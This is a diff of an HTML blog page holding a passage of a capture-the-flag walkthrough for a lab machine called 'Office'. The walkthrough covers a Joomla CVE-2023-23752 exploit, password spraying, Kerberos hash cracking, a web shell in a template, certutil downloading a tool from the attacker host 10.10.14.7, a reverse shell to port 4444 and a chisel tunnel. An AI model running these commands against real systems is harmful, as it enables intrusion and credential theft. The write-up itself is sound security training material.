@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.9.0.802684146396">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.807375038140">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.9.0">
+    <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
     <title>Office (Hard)</title>
@@ -32,43 +32,43 @@
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.9.0.802684146396" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.807375038140" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.9.0.802684146396" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.9.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.9.0.802684146396" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.9.0.802684146396" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.807375038140" defer></script>
 </head>
 <body>
-    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
-        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
     
-        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
             <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                 <!-- Mobile menu button skeleton -->
-                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
-                <div v-cloak id="docs-sidebar-toggle"></div>
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
         
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
                             <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">bytebl33d</span>
-                        </a><span class="hidden mt-1 px-2 py-1 ml-4 text-xs font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-md md:inline-block">Blog</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">Blog</span>
                     </div>
         
-                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                 </div>
         
                 <div class="flex justify-between md:grow">
                     <!-- Top Nav -->
-                    <nav class="hidden md:flex">
+                    <nav id="retype-header-nav" class="hidden md:flex">
                         <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
                             </li>
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
                             </li>
         
                         </ul>
@@ -82,7 +82,7 @@
                             <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                             </div>
-                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                         </div>
         
                         <!-- Mobile search button -->
@@ -100,7 +100,7 @@
                     </div>
         
                     <div v-cloak class="flex justify-end grow">
-                        <div id="docs-mobile-search-button"></div>
+                        <div id="retype-mobile-search-button"></div>
                         <doc-search-desktop></doc-search-desktop>
         
                         <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
@@ -110,25 +110,26 @@
             </div>
         </header>
     
-        <div class="container relative flex bg-white">
+    
+        <div id="retype-container" class="container relative flex bg-white">
             <!-- Sidebar Skeleton -->
-            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-white border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
             
                 <div class="flex items-center h-16 px-6">
-                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                 </div>
             
                 <div class="pl-6 mt-1 mb-4">
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                 </div>
             
-                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
-                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                         <span class="text-xs whitespace-nowrap">Powered by</span>
                         <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                     </a>
@@ -138,23 +139,23 @@
             <!-- Sidebar component -->
             <doc-sidebar v-cloak>
                 <template #sidebar-footer>
-                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
             
-                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                             <nav>
                                 <ul class="flex flex-wrap justify-center items-center">
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
                                     </li>
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
                                     </li>
             
                                 </ul>
                             </nav>
                         </div>
             
-                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                             <span class="text-xs whitespace-nowrap">Powered by</span>
                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                         </a>
@@ -162,14 +163,14 @@
                 </template>
             </doc-sidebar>
     
-            <div class="grow min-w-0 dark:bg-dark-850">
+            <div class="grow min-w-0 bg-body-bg">
                 <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                 <div class="flex">
-                    <div class="min-w-0 p-4 grow md:px-16">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                         <main class="relative pb-12 lg:pt-2">
-                            <div class="docs-markdown" id="docs-content">
+                            <div class="retype-markdown" id="retype-content">
                                 <!-- Rendered if sidebar right is enabled -->
-                                <div id="docs-sidebar-right-toggle"></div>
+                                <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
 <doc-anchor-target id="office-hard" class="break-words">
     <h1>
@@ -187,7 +188,7 @@
 </div>
 
 <p><figure class="content-center">
-    <img src="../../../../assets/images/headers/office.png" alt="" />
+    <img src="../../../../assets/images/headers/office.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -206,7 +207,7 @@
 </doc-anchor-target>
 <p>The initial phase begins with an <code v-pre>nmap</code> scan, revealing that the target is a Windows Domain Controller.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ nmap -p- 10.10.11.3
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nmap -p- 10.10.11.3
 Nmap scan report for 10.10.11.3
 Host is up (0.015s latency).
 Not shown: 65516 filtered tcp ports (no-response)
@@ -233,7 +234,7 @@ PORT      STATE SERVICE
 </doc-codeblock></div>
 <p>The domain being used is <code v-pre>office.htb</code> and the Domain Controller is called <code v-pre>DC</code> so we can add those to our <code v-pre>/etc/hosts</code> file.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ echo 10.10.11.3 office.htb dc.office.htb | sudo tee -a /etc/hosts</code></pre>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ echo 10.10.11.3 office.htb dc.office.htb | sudo tee -a /etc/hosts</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="joomla-website">
     <h3>
@@ -243,13 +244,13 @@ PORT      STATE SERVICE
 </doc-anchor-target>
 <p>On accessing the website, we encounter a Joomla CMS for &quot;Tony Stark&#x27;s Iron Man Company&quot;. By checking the version, we identify it as <code v-pre>4.2.7</code>, which is vulnerable to a known exploit (<code v-pre>CVE-2023-23752</code>).</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/office/joomla-version.png" alt="Joomla Version" />
+    <img src="../../../../assets/images/writeups/office/joomla-version.png" alt="Joomla Version" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption">Joomla Version</figcaption>
 </figure>
 </p>
 <p>We find a PoC script for <code v-pre>CVE-2023-23752</code> on <a href="https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT">GitHub</a>. Running the exploit provides us with a username and password.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python CVE-2023-23752.py -u http://10.10.11.3
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python CVE-2023-23752.py -u http://10.10.11.3
 ┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓━┓┏━┏┓
 ┃ ┃┃┣ ━━┏┛┃┫┏┛ ┫━━┏┛ ┫ ┃┗┓┏┛
 ┗┛┗┛┗┛  ┗━┗┛┗━┗┛  ┗━┗┛ ╹┗┛┗━
@@ -278,7 +279,7 @@ Coded By: K3ysTr0K3R --&gt; Hug me ʕっ•ᴥ•ʔっ
 </doc-anchor-target>
 <p>With port <code v-pre>88</code> open, we proceed to enumerate domain usernames using <code v-pre>kerbrute</code>, successfully identifying several valid accounts.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ kerbrute userenum -d office.htb --dc 10.10.11.3 jsmith.txt
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ kerbrute userenum -d office.htb --dc 10.10.11.3 jsmith.txt
     __             __               __
    / /_____  _____/ /_  _______  __/ /____
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
@@ -312,7 +313,7 @@ Version: v1.0.3 (9dad6e1) - 07/16/24 - Ronnie Flathers @ropnop
 </doc-anchor-target>
 <p>By performing a password spraying attack using <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a> we gain access to the domain with the <code v-pre>dwolfe</code> account.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ cat ad_users.txt
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ cat ad_users.txt
 Administrator
 ewhite
 dmichael
@@ -333,7 +334,7 @@ SMB         10.10.11.3      445    DC               [-] office.htb\ppotts:H0lOgr
 </doc-codeblock></div>
 <p>We explore the accessible shares, discovering a PCAP file that holds valuable information.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ smbmap -H 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!'
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ smbmap -H 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!'
 [*] Detected 1 hosts serving SMB
 [*] Established 1 SMB connections(s) and 1 authenticated session(s)
 
@@ -350,32 +351,32 @@ SMB         10.10.11.3      445    DC               [-] office.htb\ppotts:H0lOgr
 </doc-codeblock></div>
 <p>The user <code v-pre>dwolfe</code> has access over the <code v-pre>SOC Analysis</code> share and can connect to the share using <code v-pre>smbclient</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ smbclient.py 'office.htb/dwolfe:H0lOgrams4reTakIng0Ver754!@10.10.11.3'
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ smbclient.py 'office.htb/dwolfe:H0lOgrams4reTakIng0Ver754!@10.10.11.3'
 # use SOC Analysis
 # mget *
 [*] Downloading Latest-System-Dump-8fbc124d.pcap</code></pre>
 </doc-codeblock></div>
 <p>The share contains a <code v-pre>PCAP</code> file, so lets inspect this further with WireShark. We start by showing the <code v-pre>Protocol Hierarchy</code> and notice there are several frames for the <code v-pre>Kerberos</code> protocol.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/office/pcap-kerberos.png" alt="PCAP Protocol Hierarchy" />
+    <img src="../../../../assets/images/writeups/office/pcap-kerberos.png" alt="PCAP Protocol Hierarchy" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption">PCAP Protocol Hierarchy</figcaption>
 </figure>
 </p>
 <p>Filtering the packets on the Kerberos protocol we notice an NTLM authentication session using SMB, which transmits an <code v-pre>AS-REQ</code>. In the second AS-REQ packet, we have a hashed timestamp. We can use this information to attempt to crack the password of the user that tried to authenticate.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/office/pcap-kerberos-req.png" alt="PCAP Kerberos As-Req" />
+    <img src="../../../../assets/images/writeups/office/pcap-kerberos-req.png" alt="PCAP Kerberos As-Req" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption">PCAP Kerberos As-Req</figcaption>
 </figure>
 </p>
 <p>We can create a <code v-pre>Kerberos Pre-Auth</code> hash for the user <code v-pre>tstark</code>. To do this we first have to check the format that is expected by <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat</a>.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/office/kerberos-preauth-format.png" alt="Hashcat kerberos example" />
+    <img src="../../../../assets/images/writeups/office/kerberos-preauth-format.png" alt="Hashcat kerberos example" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption">Hashcat kerberos example</figcaption>
 </figure>
 </p>
 <p>We can now reconstruct the hash and crack it.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat -m 19900 tstark.hash $ROCKYOU
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat -m 19900 tstark.hash $ROCKYOU
 
 &lt;SNIP&gt;
 
@@ -404,24 +405,24 @@ $krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a41445941761
 </doc-anchor-target>
 <p>We found that <code v-pre>tstark</code> is also the administrator user for the Joomla backend so we can login with the following credentials: <code v-pre>Administrator:playboy69</code>. Next we can go to <code v-pre>System &gt; Site Templates</code> and select the available template. We can then add a web shell on one of the available pages (e.g. <code v-pre>error.php</code>) to get remote code execution.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/office/joomla-rce.png" alt="Joomla RCE" />
+    <img src="../../../../assets/images/writeups/office/joomla-rce.png" alt="Joomla RCE" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption">Joomla RCE</figcaption>
 </figure>
 </p>
 <p>We test if we can get remote code execution with the following command:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ curl http://10.10.11.3/templates/cassiopeia/error.php?bashee=whoami
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ curl http://10.10.11.3/templates/cassiopeia/error.php?bashee=whoami
 office\web_account</code></pre>
 </doc-codeblock></div>
 <p>Looks like we have command execution, so lets try to get a reverse shell. We can try to get a shell as <code v-pre>tstark</code> directly by using <a href="https://github.com/antonioCoco/RunasCs">RunasCs.exe</a> since we know the password of this user on the machine. We will start a Python webserver on our host and run the following commands to download our executable and get a shell.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">certutil -f -urlcache http%3A%2F%2F10.10.14.7%3A8888%2FRunasCs.exe RunasCs.exe
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">certutil -f -urlcache http%3A%2F%2F10.10.14.7%3A8888%2FRunasCs.exe RunasCs.exe
 
 .%5CRunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.7%3A4444</code></pre>
 </doc-codeblock></div>
 <p>We start a <code v-pre>pwncat</code> listener to catch our shell. Afterwards we get a shell as <code v-pre>tstark</code> and can get the user flag.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ pwncat-cs -m windows -lp 4444
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ pwncat-cs -m windows -lp 4444
 (remote) tstark@DC:C:\Windows\system32$ cd C:\Users\tstark\Desktop
 (remote) tstark@DC:C:\Users\tstark\Desktop$ dir
 Directory: C:\Users\tstark\Desktop
@@ -438,7 +439,7 @@ Mode                 LastWriteTime         Length Name
 </doc-anchor-target>
 <p>Looking at the installed applications, we notice <code v-pre>LibreOffice 5</code> is installed.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\Program Files$ dir
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\Program Files$ dir
 Directory: C:\Program Files
 
 Mode                 LastWriteTime         Length Name
@@ -462,7 +463,7 @@ d-----         4/14/2023   3:23 PM                Wireshark</code></pre>
 </doc-codeblock></div>
 <p>Older versions of <code v-pre>LibreOffice</code> usually have vulnerabilities that allow for code execution if a user opens a malicious document. To find the exact version we can execute the following command.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\Users\tstark\Desktop$ wmic product get name
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\Users\tstark\Desktop$ wmic product get name
 Name
 Office 16 Click-to-Run Extensibility Component
 Office 16 Click-to-Run Licensing Component
@@ -478,7 +479,7 @@ Microsoft Search in Bing</code></pre>
 </doc-codeblock></div>
 <p>Looking further we also find an internal website. Quickly looking at the source code seems like we can upload a resume, but we cannot find this to be a public facing website.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\xampp\htdocs\internal$ ls
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">(remote) tstark@DC:C:\xampp\htdocs\internal$ ls
 Directory: C:\xampp\htdocs\internal
 
 Mode                 LastWriteTime         Length Name
@@ -491,7 +492,7 @@ d-----          5/1/2023   4:27 PM                img
 </doc-codeblock></div>
 <p>After looking a bit further, we can find a virtual host configuration in <code v-pre>C:\xampp\apache\conf\httpd.conf</code>. It looks like the internal website is running on port <code v-pre>8083</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">#Listen 12.34.56.78:80
+<pre translate="no" class="language-none"><code v-pre class="language-none">#Listen 12.34.56.78:80
 Listen 80
 Listen 8083
 
@@ -511,14 +512,14 @@ Listen 8083
 </doc-codeblock></div>
 <p>We can try to access the internal website by uploading a <a href="https://github.com/jpillora/chisel">Chisel</a> agent on the host.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">(local) pwncat$ upload /home/s3rp3nt/Tools/Windows/chisel_1.9.1_windows_amd64 c.exe
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">(local) pwncat$ upload /home/s3rp3nt/Tools/Windows/chisel_1.9.1_windows_amd64 c.exe
 (remote) tstark@DC:C:\Users\tstark$ .\c.exe client 10.10.14.7:8000 R:8083:127.0.0.1:8083
 
 $ ./chisel_1.9.1_linux_amd64 server --port 8000 --reverse</code></pre>
 </doc-codeblock></div>
 <p>We can now access the internal website by browsing to <code v-pre>http://127.0.0.1:8083</code> and we also find the page where we can upload a resume.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/office/resume-upload.png" alt="Web form resume upload" />
